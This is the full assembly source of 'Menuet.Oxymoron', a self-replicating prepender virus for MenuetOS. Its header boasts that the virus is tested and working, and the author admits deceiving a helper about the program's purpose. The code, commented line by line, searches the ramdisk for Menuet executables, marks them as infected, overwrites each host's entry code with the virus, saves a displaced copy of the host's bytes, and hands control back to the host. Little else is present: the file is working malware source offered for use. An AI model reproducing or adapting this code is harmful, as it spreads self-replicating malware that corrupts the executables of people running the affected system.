;  Menuet.Oxymoron
;  by Second Part To Hell[rRlf]
;  www.spth.de.vu
;  spth@priest.com
;  written from february 2004 - june 2004
;  in Austria
;
;  I proudly present my latest project: A MenuetOS file infector.
;  The following code is the world's first Prepender for MenuetOS.
;  I tested the whole code with MenuetOS 0.77 pre 2.8, and it fully
;  works.
;
;  Now I want to explain you how the virus works:
;	- Searchs it's code
;	- Searchs for files
;	- Check if the file is a deleted file
;	- Check if the file is a directory
;	- Check if the file is an infectable Menuet file
;	- Check if the file has reseved enougth memory
;	- Check if the file is already infected
;	- Read file into memory
;	- Write first hostbytes (buffer for virus) to end of file in memory
;	- Viruscode in memory at buffer generated before
;	- Writing Infection sign
;	- Save file in RAMDISK
;	- Writing Host at Entry Point of file
;	- Execute Host
;
;  Now I want to tell you how I got the name for it:
;  Oxymoron are tue words which's sence don't exist. An example for that:
;  Black Milk, or Burning Water. As I thought, 'Menuet' and 'Virus' are also
;  uncompainable, I named my virus 'Oxymoron'. (Per fortuna it's not true)
;
;  There are some guys I have to thank, otherwise I would not have made it:
;  + VxF		<-- Much thanks for telling me about Menuet. It's great :)
;		    I wonder why you haven't written this thing before me, but
;		    ok... Thanks also for helping me when I started to code it
;		    with many advises and suggestions. You are great!!!
;
;  + jpelczar	<-- The progging-freak from #MenuetOS :) Much thanks for all you
;		    did for me, the whole coding (asm) help, the OS help, the
;		    the file system help and much more. Nobody would read this
;		    without you! Ohh, sorry that i lied about the purpose of the
;		    program, but i don't think that you would have helped me if
;		    you have known that I need it for a virus.
;
;  + Ville Mikael Turjanmaa	<-- Hi! Much thanks for writing this great OS,
;				    i love it (as you can see). Go on with this
;				    piece of code. Two things: The SYSTREE could
;				    be better, it was very time-intensiv to test
;				    my programs. 2nd: A search engine would be
;				    great. It's damn silly to search the files
;				    listed in any order. :)
;
;  I have explained nearly every line of the code, so you should understand how
;  it works. But to understand the stranges of MenuetOS, you have to play around
;  with the OS. I will definitivly write an article about the infection in Menuet
;  and other stranges. If you are interested in Menuet, go to the following site,
;  www.menuetos.org, download the latest Version of the OS, and do whatever you want
;  to do. :)
;
;
; - - - - - - - - - [ Menuet.Oxymoron ] - - - - - - - - - 
;
	viruslength	equ I_END-START

use32
   
 		org     0x0
   
		db      'MENUET00'		; 8 byte id
		dd      23			; required os & Virus infection Mark
		dd      START			; Program start
		dd      I_END			; Program length
		dd      0x100000		; Required amount of memory
		dd      0x00000000		; reserved=no extended header

START:
	pushad			; Save the original register-contents to stack

	mov	ebp, dword [0xC]	; Save the virussize in ebp

	mov	edi, ebp	; Move the offset of the code-start
	add	di, (flb_bs-START)	; Get the relative offset
	mov	al, 1		; What to write = RESTORING
	stosb			; Write al to memory at offset edi

	add	di, (fle-START)-(flb_bs-START)	; Get the relative Offset
	mov	al, 0x20	; What to write (Space)

	xor	ecx, ecx	; ecx=0
	mov	cl, 11		; How much to write - 11 bytes

   rdfn:			; Restore Data - File Name
	stosb			; Write 20h to edi
   loop rdfn			; Jump to fn2fb if ecx>0 && dec ecx

	xor	eax, eax	; eax=0
	mov	al, 58		; SYSTEM TREE ACCESS
	mov	ebx, ebp	; pointer to fileinfo-block
	add	bx, (dir_block-START)	; Get the relative offset
	int	0x40		; System Call

	mov	ebx, 0x20000	; Move Offset of filename to ebx

nextfile:
	add	ebx, 32		; Next Filename

	cmp	ebx, 0x22000	; Compair ebx with 0x22000
	je	endinf		; If equal, stop it

	mov	cl, [ebx]	; First letter of Filename to cl
	cmp	cl, 0xE5	; Compair with 0xE5 (which is the sign of a DELETED file)
	je	nextfile	; If so, get next file

	mov	cl, [ebx+11]	; Move the attribute bits to cl
	and	cl, 0x10	; AND 0x10 ( ???1 ???? = FOLDER )
	jnz	nextfile	; If not zero, get next file

	mov	edx, ebx	; Save ebx in edx
	mov	edi, ebp	; Move fle (11 letter buffer) to edi
	add	di, (fle-START)	; Get the relative Offset

	xor	ecx, ecx	; ecx=0
	mov	cl, 11		; Move 11 to ecx (counter=11)
   fn2fb:			; File Name to File Block
	mov	al, [ebx]	; Move the ebx-value to al
	stosb			; Write al to memory at offset edi (=11 letter buffer)
	inc	ebx		; Get next letter
   loop	fn2fb			; Jump to fn2fb if ecx>0 && dec ecx

	xor	eax, eax	; eax=0
	mov	al, 58		; SYSTEM TREE ACCESS
	mov	ebx, ebp	; pointer to file-block
	add	bx, (file_block-START)	; Get the relative Offset
	int	0x40		; System Call
	mov	ebx, edx	; Restore original ebx (Filename offset)

	mov	eax, 0x25000	; Move Offset of readed file-content to eax
	cmp	dword [eax], 'MENU'	; Compair a double-word with 'MENU'
	jne	nextfile	; If not equal (=No Menuet-executed file), get next file

	add	al, 8		; eax = 0x25000 + 0x8 = Infection mark offset
	cmp	byte [eax], 23	; Compair a byte with 23
	je	nextfile	; If equal (file is already infected), get next file

	add	al, 12		; eax= 0x25008+12 = Memory used by file
	cmp	dword [eax], 0x50000	; Compaire with 0x50000 (most files have the double)
	jl	nextfile	; If less (too few memory for the virus), get next file

	mov	eax, dword [ebx+28]	; Move the filesize to eax
	shr	eax, 9		; Get the blocks to read
	inc	eax		; For reading the last not completed block

	mov	edi, ebp	; Move the offset where to write
	add	di, (flb_bs-START)	; Get the relative Offset
	stosb			; Write [al] to di in memory

	mov	edx, ebx	; Save ebx to edx
	xor	eax, eax	; eax=0
	mov	al, 58		; SYSTEM TREE ACCESS
	mov	ebx, ebp	; pointer to file-block
	add	bx, (file_block-START)	; Get the relative offset
	int	0x40		; System Call

	mov	ebx, edx	; Restore original ebx (Filename offset)


;;	Write first part (bytes of virus) of the host code to end
;;	because these bytes will be overwritten.

	mov	edi, dword [0x25010]	; Where to write: End of file
	add	edi, 0x25000	; Add memory offset of hostcode

	mov	cx, viruslength	; Viruslength to ecx
	add	ecx, dword [0x2500C]	; add Header-length
	cmp	dword [0x25010], ecx	; Check if the file is smaller than the virus

	jge	notsmall	; If not greater or equal, calculate another offset for writing

	xchg	edi, ecx	; Move the real start to edi
	add	edi, 0x25000	; Add memory offset

 notsmall:
	xor	ecx, ecx	; ecx=0
	mov	cx, viruslength	; How much to read: Viruslength

	mov	edx, dword [0x2500C]	; What to read: Entry Point of file
	add	edx, 0x25000	; Add memory offset of hostcode

   fp2eof:			; First part to end of file
	mov	al, [edx]	; Move a victim code's byte to al
	stosb			; Write al to memory at offset edi (end of file)
	inc	edx		; Get next byte
   loop fp2eof			; Jump to fp2eof if ecx>0 && dec ecx


;;	Overwrite first part of host file with viruscode

	mov	cx, viruslength	; How much to write: Virus length
	mov	edx, ebp	; What to write: Viruscode

	mov	edi, dword [0x2500C]	; Where to write: Entry Point of file
	add	edi, 0x25000	; Add memory offset of hostcode

   vc2vm:			; Virus code to victim memory
	mov	al, [edx]	; Move a virus code's byte to al
	stosb			; Write al to memory at offset edi (Start of victim's code)
	inc	edx		; Get next virus byte
   loop vc2vm			; Jump to vc2vm if ecx>0 && dec ecx


;;	Infection Mark  <-- Against double-infection

	mov	edi, 0x25008	; Move the point of the infection sign
	mov	al, 23		; What to write (the infection mark)
	stosb			; Write infection mark to file

	mov	edi, ebp	; Move the offset where to write
	add	di, (flb_bs-START)	; Get the relative Offset
	mov	eax, dword [ebx+28]	; What to write (Old Filesize)
	add	eax, viruslength	; Add virussize
	stosd			; Write eax to memory at offset edi


;;	Write memory with new built infected file to RAMDISK

	mov	edi, ebp	; Move the offset where to write
	add	di, (flb_kd-START)	; Get the relative Offset
	mov	al, 1		; What to write (1 for writing)
	stosb			; Write al to memory at offset edi

	mov	edx, ebx	; Save ebx to edx

	xor	eax, eax	; eax=0
	mov	al, 58		; SYSTEM TREE ACCESS
	mov	ebx, ebp	; pointer to file_block
	add	bx, (file_block-START)	; Get the relative Offset
	int	0x40		; System Call


;;	Restore some memory stuff and register

	mov	ebx, edx	; Restore ebx

	mov	edi, ebp	; Move the offset where to write
	add	di, (flb_kd-START)	; Get the relative Offset
	xor	al, al		; What to write (0 for reading) = RESTORING
	stosb			; Write al to memory at offset edi

	mov	edi, ebp	; Move the offset where to write
	add	di, (flb_bs-START)
	inc	al		; What to write = RESTORING
	stosb			; Write al to memory at offset edi

	jmp	nextfile	; Get Next File

endinf:

	mov	ebx, ebp	; What to write - Offset of vircode
	add	bx, (rebu-START)	; Add relative address

	mov	edi, 0x20000	; Where to write
	mov	cl, (rebuend-rebu)	; How much to write (whole rebuild-code)

   rb2m:			; Rebuild code to memory
	mov	al, [ebx]	; Move one byte of rebuild-code to al
	stosb			; Write al to offset edi
	inc	ebx		; Get next byte
   loop rb2m			; Jump to rbch if ecx>0 && inc ecx

	mov	ebx, 0x20000
	jmp	ebx		; Jump to rebuild code in memory
				; Now the viruscode in memory will be replaced by the
				; old original host code, and the control comes back to
				; the host file. The reason for using memory for
				; overwrite the viruscode in memory is the fact that
				; we can't overwrite the current running code.



				; From now on, there is just data





 rebu:				; Rebuild the host code
	xor	eax, eax	; eax=0
	mov	al, 0x10	; eax=0x10
	mov	ebx, dword [eax]	; Move the file length to ebx, to get the old hostcode offset

	sub	eax, 4		; eax=0xC

	mov	edx, dword [eax]	; Move the offset of the head-length to edx
	add	dx, viruslength	; Add the virulength to edx

	cmp	ebx, edx	; Check if the file is smaller than the virus
	jge	notsmall2	; If not greater or equal, go on

	mov	ebx, edx	; Move the new offset to ebx

 notsmall2:

	mov	edi, dword [0xC]	; Where to write: 0xC
	mov	cx, viruslength	; How much to write


     rbhc:			; Rebuild host code
	mov	al, [ebx]	; One byte of the saved host code to al
	stosb			; Write al (Host code) to edi (Entry Point of file)
	inc	ebx		; Get next byte
     loop rbhc			; Jump to rbch if ecx>0 && inc ecx

	popad			; Get the original register-contents

	jmp	dword [0xC]		; Jump to Entry Point, now with the original code
 rebuend:			; Rebuild host code: End


	virmsg	db '1st Menuet Virus (Oxymoron) by Second Part To Hell/rRlf'


dir_block:
	dd 0			; 0=READ
	dd 0x0			; 512 block to read 0+
	dd 0x16			; blocks to read (/bytes to write/append)
	dd 0x20000		; return data pointer
	dd 0x10000		; work area for os - 16384 bytes
	db '/RAMDISK/FIRST',0	; ASCIIZ dir & filename

file_block:
flb_kd: dd   0			; 0=READ    (delete/append)
	dd   0x0		; 512 block to read 0+
flb_bs: dd   0x1		; blocks to read (/bytes to write/append)
	dd   0x25000		; return data pointer
	dd   0x10000		; work area for os - 16384 bytes
flpath	db '/RAMDISK/FIRST/'
fle	db '           ',0

I_END: